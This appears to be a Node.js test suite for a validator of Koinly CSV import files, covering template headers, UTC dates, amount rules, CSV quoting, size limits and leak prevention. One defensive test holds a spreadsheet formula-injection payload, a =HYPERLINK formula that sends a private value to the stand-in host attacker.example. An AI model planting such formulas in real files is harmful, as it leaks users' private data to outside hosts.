import test from "node:test";
import assert from "node:assert/strict";
import { MAX_BYTES, MAX_ROWS, MAX_COLUMNS, TEMPLATE_REQUIRED,
  parseCsv, inspectCsv, SYNTHETIC_UNIVERSAL } from "../core.mjs";
const U="Date,Sent Amount,Sent Currency,Received Amount,Received Currency";
const S="Koinly Date,Amount,Currency";
const T="Koinly Date,Pair,Side,Amount,Total";
const csv=(header,row)=>header+"\n"+row+"\n";
const universal=(row,h=U)=>csv(h,row);
const simple=(row,h=S)=>csv(h,row);
const trades=(row,h=T)=>csv(h,row);
const has=(report,code)=>report.issues.some(i=>i.code===code);

test("all official Koinly templates have exact required columns",()=>{
  assert.deepEqual(TEMPLATE_REQUIRED.universal,["Date","Sent Amount","Sent Currency","Received Amount","Received Currency"]);
  assert.deepEqual(TEMPLATE_REQUIRED.simple,["Koinly Date","Amount","Currency"]);
  assert.deepEqual(TEMPLATE_REQUIRED.trades,["Koinly Date","Pair","Side","Amount","Total"]);
});
test("synthetic mixed Universal example is structurally valid, never taxable proof",()=>{
  const a=inspectCsv(SYNTHETIC_UNIVERSAL,"universal");
  assert.equal(a.dataRowCount,3);assert.equal(a.errors,0);
  assert.equal(a.structurallyReady,true);
  assert.equal(a.userMustVerifyKoinlyImport,true);
  assert.equal(a.taxAdviceProvided,false);
  assert.equal(a.blockchainSettlementVerified,false);
  assert.equal(a.sourceFileUploaded,false);
});
test("Universal deposit uses Received only",()=>assert.equal(inspectCsv(universal("2026-10-20 07:20:01,,,1.250000,ETH"),"universal").errors,0));
test("Universal withdrawal uses Sent only",()=>assert.equal(inspectCsv(universal("2026-10-20 07:20:01,1.250000,ETH,,"),"universal").errors,0));
test("Universal trade has gross Sent and Received",()=>assert.equal(inspectCsv(universal("2026-10-20 07:20:01,75.000000,USDC,0.020000,ETH"),"universal").errors,0));
test("Simple deposit is positive",()=>assert.equal(inspectCsv(simple("2026-10-20 07:20:01,1.25,ETH"),"simple").errors,0));
test("Simple withdrawal can be explicitly negative",()=>assert.equal(inspectCsv(simple("2026-10-20 07:20:01,-1.25,ETH"),"simple").errors,0));
test("Trades Buy with base and quote has positive gross",()=>assert.equal(inspectCsv(trades("2026-10-20 07:20:01,BTC-USDC,Buy,0.1,7000"),"trades").errors,0));
test("Trades Sell with slash separator supported",()=>assert.equal(inspectCsv(trades("2026-10-20 07:20:01,BTC/USDC,Sell,0.1,7000"),"trades").errors,0));
test("Universal requires Date NOT Koinly Date",()=>{
  const a=inspectCsv(universal("2026-10-20 07:20:01,,,1,USDC",U.replace("Date","Koinly Date")),"universal");
  assert.ok(has(a,"MISSING_REQUIRED_HEADER"));assert.equal(a.structurallyReady,false);
});
test("Simple requires Koinly Date NOT Date",()=>{
  assert.ok(has(inspectCsv(simple("2026-10-20 07:20:01,1,USDC","Date,Amount,Currency"),"simple"),"MISSING_REQUIRED_HEADER"));
});
test("header extra whitespace rejected and never autocorrected",()=>{
  const a=inspectCsv(simple("2026-10-20 07:20:01,1,USDC","Koinly Date ,Amount,Currency"),"simple");
  assert.ok(has(a,"HEADER_HAS_EXTRA_SPACES"));assert.ok(has(a,"MISSING_REQUIRED_HEADER"));
});
test("duplicate header rejected",()=>assert.ok(has(inspectCsv(simple("2026-10-20 07:20:01,1,USDC,1","Koinly Date,Amount,Currency,Amount"),"simple"),"DUPLICATE_EXACT_HEADER")));
test("invalid nonleap February 29 rejected",()=>assert.ok(has(inspectCsv(simple("2026-02-29 07:20:01,1,USDC"),"simple"),"UTC_DATE_FORMAT_OR_CALENDAR")));
test("valid leap year February 29 passes",()=>assert.equal(inspectCsv(simple("2024-02-29 23:59:59,1,USDC"),"simple").errors,0));
test("timezone suffix never silently converted to UTC",()=>assert.ok(has(inspectCsv(simple("2026-10-20 07:20:01+09:00,1,USDC"),"simple"),"UTC_DATE_FORMAT_OR_CALENDAR")));
test("short date without hours is inconclusive",()=>assert.ok(has(inspectCsv(simple("2026-10-20,1,USDC"),"simple"),"UTC_DATE_FORMAT_OR_CALENDAR")));
test("zero trade quantity rejected",()=>assert.ok(has(inspectCsv(simple("2026-10-20 07:20:01,0,USDC"),"simple"),"INVALID_SIMPLE_SIGNED_AMOUNT")));
test("scientific-notation amounts never interpreted",()=>assert.ok(has(inspectCsv(simple("2026-10-20 07:20:01,1e4,USDC"),"simple"),"INVALID_SIMPLE_SIGNED_AMOUNT")));
test("thousands separators invalid",()=>assert.ok(has(inspectCsv(simple('2026-10-20 07:20:01,"1,500",USDC'),"simple"),"INVALID_SIMPLE_SIGNED_AMOUNT")));
test("18-digit native EVM decimal precision preserved in strings",()=>assert.equal(inspectCsv(simple("2026-10-20 07:20:01,0.000000000000000001,ETH"),"simple").errors,0));
test("Universal negative Sent Amount forbidden",()=>assert.ok(has(inspectCsv(universal("2026-10-20 07:20:01,-2,ETH,,"),"universal"),"INVALID_UNIVERSAL_POSITIVE_AMOUNT")));
test("unpaired amount/currency blocked",()=>assert.ok(has(inspectCsv(universal("2026-10-20 07:20:01,1,,,"),"universal"),"SENT_AMOUNT_CURRENCY_INCOMPLETE")));
test("Universal blank both sides blocked",()=>assert.ok(has(inspectCsv(universal("2026-10-20 07:20:01,,,,"),"universal"),"NEITHER_SENT_NOR_RECEIVED")));
test("Trades pair needs delimiter",()=>assert.ok(has(inspectCsv(trades("2026-10-20 07:20:01,BTCUSDC,Buy,1,100"),"trades"),"PAIR_MUST_HAVE_BASE_AND_QUOTE")));
test("Trades unknown Side not assumed a Buy",()=>assert.ok(has(inspectCsv(trades("2026-10-20 07:20:01,ETH-USDC,Swap,1,100"),"trades"),"SIDE_MUST_BE_BUY_OR_SELL")));
test("Trades Total must be positive",()=>assert.ok(has(inspectCsv(trades("2026-10-20 07:20:01,ETH-USDC,Buy,1,-100"),"trades"),"INVALID_TRADE_POSITIVE_AMOUNT")));
test("RFC quoted commas and double-quotes parsed without dropping bytes",()=>assert.deepEqual(parseCsv('A,B\r\n"hello, there","hello ""world"""\r\n'),[["A","B"],["hello, there",'hello "world"']]));
test("multi-line quoted cell stays single record",()=>assert.deepEqual(parseCsv('A,B\n"one\ntwo",third\n'),[["A","B"],["one\ntwo","third"]]));
test("UTF8 BOM accepted only at file beginning",()=>assert.equal(inspectCsv("\ufeff"+simple("2026-10-20 07:20:01,1,ETH"),"simple").errors,0));
test("trailing CRLF never creates a phantom data row",()=>assert.equal(parseCsv("A,B\r\nc,d\r\n").length,2));
test("unclosed quote hard fails",()=>assert.throws(()=>parseCsv('A,B\n"hello,world\n'),e=>e.code==="UNCLOSED_QUOTE"));
test("unescaped double quote hard fails",()=>assert.throws(()=>parseCsv('A,B\nx"y,z\n'),e=>e.code==="UNEXPECTED_QUOTE"));
test("text after closing quote hard fails",()=>assert.throws(()=>parseCsv('A,B\n"hello"xy,world\n'),e=>e.code==="TEXT_AFTER_CLOSING_QUOTE"));
test("missing or extra row columns detected not inferred",()=>assert.ok(has(inspectCsv(simple("2026-10-20 07:20:01,1"),"simple"),"COLUMN_COUNT_MISMATCH")));
test("large input bounded",()=>assert.throws(()=>parseCsv("A\n"+("x".repeat(MAX_BYTES+1))),e=>e.code==="FILE_TOO_LARGE"));
test("row-count cap applies before reporting original source values",()=>{
  const z="A\n"+Array.from({length:MAX_ROWS+5},()=> "x").join("\n");
  assert.throws(()=>parseCsv(z),e=>e.code==="TOO_MANY_ROWS");
});
test("column-count cap applies before parsing unbounded header fields",()=>assert.throws(()=>parseCsv(Array.from({length:MAX_COLUMNS+1},(_,i)=>"F"+i).join(",")),e=>e.code==="TOO_MANY_COLUMNS"));
test("binary NUL content rejected",()=>assert.throws(()=>parseCsv("A,B\n\0,b"),e=>e.code==="BINARY_NUL_REJECTED"));
test("empty file rejected",()=>assert.throws(()=>parseCsv(""),e=>e.code==="EMPTY_FILE"));
test("unsupported template rejected",()=>assert.throws(()=>inspectCsv(simple("2026-10-20 07:20:01,1,BTC"),"user-secret-type"),e=>e.code==="UNKNOWN_TEMPLATE"));
test("spreadsheet formula-like malicious source cell warns, without any contents in result",()=>{
  const evil='=HYPERLINK("https://attacker.example/?private=DO_NOT_LEAK_ME")';
  const raw='Koinly Date,Amount,Currency,Description\n2026-10-20 07:20:01,1,BTC,"'+evil.replaceAll('"','""')+'"\n';
  const x=inspectCsv(raw,"simple");
  assert.ok(has(x,"SPREADSHEET_FORMULA_LIKE_CELL"));
  assert.ok(!JSON.stringify(x).includes("DO_NOT_LEAK_ME"));
});
test("private unrecognized header and actual sample values not leaked",()=>{
  const secret="PRIVATE_CUSTOMER_USDC_INVOICE_8435_DO_NOT_ECHO";
  const a=inspectCsv(universal("2026-10-20 07:20:01,,,5,USDC,anything",U+","+secret),"universal");
  assert.ok(!JSON.stringify(a).includes(secret));
  assert.ok(!JSON.stringify(a).includes("2026-10-20"));
});
test("private malformed numeric value omitted from sanitized issue code",()=>{
  const secret="SECRET_CUSTOMER_TX_ID_KEEP_LOCAL";
  const a=inspectCsv(simple("2026-10-20 07:20:01,"+secret+",BTC"),"simple");
  assert.ok(has(a,"INVALID_SIMPLE_SIGNED_AMOUNT"));assert.ok(!JSON.stringify(a).includes(secret));
});
test("no Koinly import acceptance or tax/chain success ever claimed",()=>{
  const a=inspectCsv(SYNTHETIC_UNIVERSAL,"universal");
  assert.equal(a.structurallyReady,true);
  for(const key of ["taxAdviceProvided","historicalCostBasisCalculated","blockchainSettlementVerified","sourceFileUploaded","originalValuesExposed"]){assert.equal(a[key],false);}
});
test("no network, bounded constant surface",()=>{
  assert.ok(MAX_BYTES<=524288);assert.ok(MAX_ROWS<=200);assert.ok(MAX_COLUMNS<=36);
});
